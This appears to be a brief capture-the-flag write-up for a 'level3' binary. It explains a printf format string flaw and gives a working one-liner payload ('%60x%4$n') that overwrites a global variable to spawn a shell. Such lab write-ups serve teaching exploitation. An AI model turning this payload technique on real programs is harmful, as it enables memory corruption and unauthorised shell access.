The code calls printf without format string.
Then it move 0x804988c into %eax, compare it against $0x40, and open a shell if they are equal
So we could try to set 0x804988c to 0x40
The command is :
```
python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/str && cat /tmp/str - | ./level3
```
- `\x8c\x98\x04\x08` is the target adress
- `%60x` add 60 bytes off padding. Added to our address, we have written 64bytes.
- `%4` is the 4th arg of the stack. It's the begining of our string, aka the adress
- `$n` write the length of the output at the given time to the pointeur passed as arg
So it will write 64 (current output len) to the address, thanks to %4 !

more details here: https://axcheron.github.io/exploit-101-format-strings/

